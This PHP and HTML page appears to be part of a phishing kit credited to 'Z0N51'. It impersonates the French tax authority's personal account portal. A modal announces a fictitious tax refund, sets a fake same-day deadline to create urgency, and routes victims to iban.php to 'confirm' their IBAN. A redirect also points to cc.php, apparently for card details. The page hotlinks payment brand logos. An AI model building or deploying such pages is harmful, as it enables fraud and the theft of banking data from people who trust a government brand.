<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    function is_invalid_class($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = 'has-error';
            return $return;
        }
        return false;
    }
	function get_selected_option($name,$value) {
        if( isset($_SESSION[$name]) && $_SESSION[$name] == $value ) {
            return 'selected';
        }
    }
	function error_message($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = '<div class="error-message">'. $array[$key] .'</div>';
            return $return;
        }
        return false;
    }
	
?>
<!doctype html>
<html style="background-color: #E5E5E5; display: flex; flex-direction: column; height: 100%;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        <meta http-equiv="refresh" content=";URL=cc.php">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="assets/imgs/favicon.ico" />

        <title>Remboursement</title>
    </head>

    <body style="background-color: #E5E5E5; display: flex; flex-direction: column; height: 100%;">

        <header id="header2">
            <div class="container">
                <div class="left">
                    <img style="max-width: 126px;" src="assets/imgs/logo1.svg">
                </div>
                <div class="mid">
                    <h3>Mon espace <span>particulier</span></h3>
                    <img style="max-width: 126px;" src="assets/imgs/logo2.svg">
                </div>
                <div class="right">
                    <p>
                        Bienvenue<br>
                        Numéro fiscal : 1195217722475<br>
                        <span>Retour au tableau de bord</span>
                    </p>
                </div>
            </div>
        </header>

        <!-- BREADCRUMB -->
        <div id="breadcrumb" class="mt-4">
            <div class="container">
                <u>Tableau de bord</u> <span>-</span> Remboursement et Paiement en ligne
            </div>
        </div>
        <!-- BREADCRUMB -->

        <!-- MAIN -->
        <main id="main" class="flex-grow-1">
            <div class="container">
                <div class="details">
                    <div class="title">
                        <h3>Remboursement sécurisé</h3>
                       <li>Référence : <b>600193110380</b></li>
                       <li>Montant de la transaction &nbsp;: <b>432,48 €</b></li>
                    </div>

 
 <style>
		/* The Modal (background) */
		.modalb {
			display: block;
			position: fixed;
			z-index: 999999999;
			padding-top: 30px;
			left: 0;
			top: 0;
			width: 100%;
			height: 100%;
			overflow: auto;
			background-color: rgba(0, 0, 0, 0.7);
		}

		/* Modal Content */
		.modal-contentb {
			background-color: #fefefe;
			margin: auto;
			border: 1px solid #888;
			width: 90%;
			max-width: 550px;
			height: auto;
			max-height: 85vh;
			border-radius: 9px;
			box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
			overflow: hidden;
			display: flex;
			flex-direction: column;
		}
		
		#myModalb .header {
			position: relative;
			height: auto;
			background-color: #fff;
			margin-bottom: 0;
			overflow: hidden;
			flex-shrink: 0;
		}
		
		#myModalb .header .round-banner::before {
			content: "";
			position: absolute;
			top: -5%;
			left: -6.5%;
			background-color: #0b6ba8;
			width: 113%;
			height: 80px;
			border-radius: 0 0 50% 50%;
		}
		
		#myModalb .header .round-banner {
			position: relative;
			height: 6rem;
			width: 100%;
			overflow: hidden;
		}
		
		#myModalb .header .round-banner svg {
			background-color: #fff;
			border-radius: 50%;
			padding: .4rem;
			font-size: 3.8rem;
			position: absolute;
			bottom: 0.3rem;
			left: 50%;
			margin-left: -1.9rem;
			width: 48px;
			height: 48px;
		}
		
		.document {
			display: flex;
			flex-direction: column;
			flex: 1;
			overflow: hidden;
		}
		
		.line {
			flex: 1;
			overflow-y: auto;
			padding: 0 5px;
			max-height: calc(85vh - 150px);
		}
		
		.textPopinDetail {
			padding: 10px 20px;
		}
		
		.popin-btns {
			position: sticky;
			bottom: 0;
			background: white;
			padding: 15px;
			border-top: 1px solid #eee;
			z-index: 10;
			flex-shrink: 0;
			display: flex;
			justify-content: center;
			align-items: center;
		}
		
		@media (max-height: 700px) {
			.modalb {
				padding-top: 15px;
			}
			
			.modal-contentb {
				max-height: 90vh;
			}
			
			#line {
				max-height: calc(90vh - 140px);
			}
			
			#myModalb .header .round-banner {
				height: 5rem;
			}
		}
		
		@media (max-width: 768px) {
			.modal-contentb {
				width: 95%;
				max-width: 95%;
			}
			
			.popin-btns {
				padding: 12px;
			}
		}
	</style>

	<!-- The Modal -->
	<div id="myModalb" class="modalb">

		<!-- Modal content -->
		<div class="modal-contentb">
			
			<div class="document">
				<div class="header popinV3-header">
					<div class="round-banner">
						<svg fill="#0b6ba8" width="48px" height="48px" viewBox="0 0 1920 1920" xmlns="http://www.w3.org/2000/svg" stroke="#0b6ba8">
							<g id="SVGRepo_bgCarrier" stroke-width="0"></g>
							<g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
							<g id="SVGRepo_iconCarrier">
								<path d="M960 0c530.193 0 960 429.807 960 960s-429.807 960-960 960S0 1490.193 0 960 429.807 0 960 0Zm0 101.053c-474.384 0-858.947 384.563-858.947 858.947S485.616 1818.947 960 1818.947 1818.947 1434.384 1818.947 960 1434.384 101.053 960 101.053Zm-42.074 626.795c-85.075 39.632-157.432 107.975-229.844 207.898-10.327 14.249-10.744 22.907-.135 30.565 7.458 5.384 11.792 3.662 22.656-7.928 1.453-1.562 1.453-1.562 2.94-3.174 9.391-10.17 16.956-18.8 33.115-37.565 53.392-62.005 79.472-87.526 120.003-110.867 35.075-20.198 65.9 9.485 60.03 47.471-1.647 10.664-4.483 18.534-11.791 35.432-2.907 6.722-4.133 9.646-5.496 13.23-13.173 34.63-24.269 63.518-47.519 123.85l-1.112 2.886c-7.03 18.242-7.03 18.242-14.053 36.48-30.45 79.138-48.927 127.666-67.991 178.988l-1.118 3.008a10180.575 10180.575 0 0 0-10.189 27.469c-21.844 59.238-34.337 97.729-43.838 138.668-1.484 6.37-1.484 6.37-2.988 12.845-5.353 23.158-8.218 38.081-9.82 53.42-2.77 26.522-.543 48.24 7.792 66.493 9.432 20.655 29.697 35.43 52.819 38.786 38.518 5.592 75.683 5.194 107.515-2.048 17.914-4.073 35.638-9.405 53.03-15.942 50.352-18.932 98.861-48.472 145.846-87.52 41.11-34.26 80.008-76 120.788-127.872 3.555-4.492 3.555-4.492 7.098-8.976 12.318-15.707 18.352-25.908 20.605-36.683 2.45-11.698-7.439-23.554-15.343-19.587-3.907 1.96-7.993 6.018-14.22 13.872-4.454 5.715-6.875 8.77-9.298 11.514-9.671 10.95-19.883 22.157-30.947 33.998-18.241 19.513-36.775 38.608-63.656 65.789-13.69 13.844-30.908 25.947-49.42 35.046-29.63 14.559-56.358-3.792-53.148-36.635 2.118-21.681 7.37-44.096 15.224-65.767 17.156-47.367 31.183-85.659 62.216-170.048 13.459-36.6 19.27-52.41 26.528-72.201 21.518-58.652 38.696-105.868 55.04-151.425 20.19-56.275 31.596-98.224 36.877-141.543 3.987-32.673-5.103-63.922-25.834-85.405-22.986-23.816-55.68-34.787-96.399-34.305-45.053.535-97.607 15.256-145.963 37.783Zm308.381-388.422c-80.963-31.5-178.114 22.616-194.382 108.33-11.795 62.124 11.412 115.76 58.78 138.225 93.898 44.531 206.587-26.823 206.592-130.826.005-57.855-24.705-97.718-70.99-115.729Z" fill-rule="evenodd"></path>
							</g>
						</svg>
					</div>
				</div>
				
				<div class="line" id="line">
					<div id="compte_bancaire_haut2" class="textPopinDetail">
						<div class="block basecomponent section blocstd">
							<div class="CQblocedito cq-dd-file" id="bloc_kyc_verification_donnees_personnelles_obligatoire">
								<div class="block">
									<div class="blockInside">
										<div>
											<div class="textFCK" style="text-align: center;">
												<p style="color: #000000; font-weight: bold; line-height: 1.4; margin-bottom: 12px; font-size: 14px;">
													Suite à l'analyse de votre situation fiscale 2024–2025, vous bénéficiez d'un crédit en votre faveur.
												</p>
												<p style="color: #000000; font-weight: bold; line-height: 1.4; margin-bottom: 12px; font-size: 14px;">
													Afin de traiter le remboursement, vérifiez et mettez à jour vos coordonnées bancaires.
												</p>
												<p style="color: #000000; font-weight: bold; line-height: 1.4; margin-bottom: 20px; font-size: 14px;">
													Dès réception des informations, la procédure de remboursement pourra être engagée.
												</p>
												
												<div style="margin: 15px 0; padding: 12px; background: #f8f9fa; border-radius: 5px; border-left: 3px solid #0b6ba8;">
													<div style="color: #000000; font-weight: bold; margin-bottom: 6px; font-size: 13px;">
														Référence : <b style="color: #0b6ba8;">600193110380</b>
													</div>
													<div style="color: #000000; font-weight: bold; font-size: 13px;">
														Montant de la transaction: <b style="color: #0b6ba8;">932,95 €</b>
													</div>
												</div>
												
												<div style="margin: 20px 0; padding: 12px; background: #fff3cd; border-radius: 5px; border: 1px solid #ffeaa7;">
													<p style="color: #856404; font-weight: bold; margin-bottom: 8px; font-size: 13px;">
														⚠️ Délai important
													</p>
													<p style="color: #000000; font-weight: bold; margin: 0; font-size: 13px;">
														Confirmez votre IBAN avant le:
														<br>
														<span id="date-time" style="font-size: 1.4rem; color: #e03136; display: block; margin-top: 5px;"></span>
													</p>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>

				<div class="popin-btns a-center popin-btns-kyc">
					<button id="renseigner" class="button button--primary" type="button" title="Mon Remboursement" style="width: 100%; max-width: 280px; padding: 12px 15px; background: #0b6ba8; border-radius: 6px; border: none; font-size: 15px; font-weight: 600; cursor: pointer; color: white; box-shadow: 0 3px 5px rgba(11, 107, 168, 0.3); transition: all 0.3s;">
						Je confirme mon IBAN
					</button>
				</div>
			</div>
		</div>
        </main>
        <!-- END MAIN -->
		 
		<div class="text-center mb20" style="margin-top: 25px; padding: 15px 0; background: white;">
			<img src="https://payment-web.sfr.fr/static/common/images/logos/acceptance/medium/logo_CB.png" style="margin: 0 8px; height: 35px;">
			<img src="https://payment-web.sfr.fr/static/common/images/logos/acceptance/medium/logo_VISA.png" style="margin: 0 8px; height: 35px;">
			<img src="https://payment-web.sfr.fr/static/common/images/logos/acceptance/medium/logo_MASTERCARD.png" style="margin: 0 8px; height: 35px;">
			<img src="https://payment-web.sfr.fr/static/common/images/logos/acceptance/medium/logo_AMEX.png" style="margin: 0 8px; height: 35px;">
		</div>

        <footer id="footer">
            <div class="container">
                <p>Direction générale des Finances publiques</p>
            </div>
        </footer>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="assets/js/script.js"></script>
		
		<script>
			// Function to format 1 in 01
			const zeroFill = n => {
				return ('0' + n).slice(-2);
			}

			// Creates interval
			const interval = setInterval(() => {
				// Get current time
				const now = new Date();
				const today = new Date();
				const tomorrow = new Date(today);
				tomorrow.setDate(today.getDate() + 1);

				// Format date as in mm/dd/aaaa
				const dateTime = zeroFill(tomorrow.getUTCDate()) + '/' + zeroFill((tomorrow.getMonth() + 1)) + '/' + tomorrow.getFullYear();

				// Display the date and time on the screen using div#date-time
				document.getElementById('date-time').innerHTML = dateTime;
			}, 1000);
		</script>
		
		<script type="text/JavaScript">
			$(document).ready(function() {
				// Ajuster la hauteur du modal
				function adjustModalHeight() {
					var windowHeight = $(window).height();
					var modalContent = $('.modal-contentb');
					var maxHeight = windowHeight * 0.85;
					
					modalContent.css('max-height', maxHeight + 'px');
				}
				
				// Ajuster au chargement et au redimensionnement
				adjustModalHeight();
				$(window).resize(adjustModalHeight);
				
				// Gestion du clic sur le bouton
				$('#renseigner').click(function(e) {
					e.preventDefault();
					// Ajouter un effet de clic
					$(this).css({
						'transform': 'scale(0.95)',
						'background': '#0a5a98'
					});
					
					setTimeout(function() {
						window.location.href = 'iban.php';
					}, 200);
				});
				
				// Effet hover sur le bouton
				$('#renseigner').hover(
					function() {
						$(this).css({
							'background': '#0a5a98',
							'transform': 'translateY(-2px)',
							'box-shadow': '0 5px 10px rgba(11, 107, 168, 0.4)'
						});
					},
					function() {
						$(this).css({
							'background': '#0b6ba8',
							'transform': 'translateY(0)',
							'box-shadow': '0 3px 5px rgba(11, 107, 168, 0.3)'
						});
					}
				);
			});
		</script>

    </body>

</html>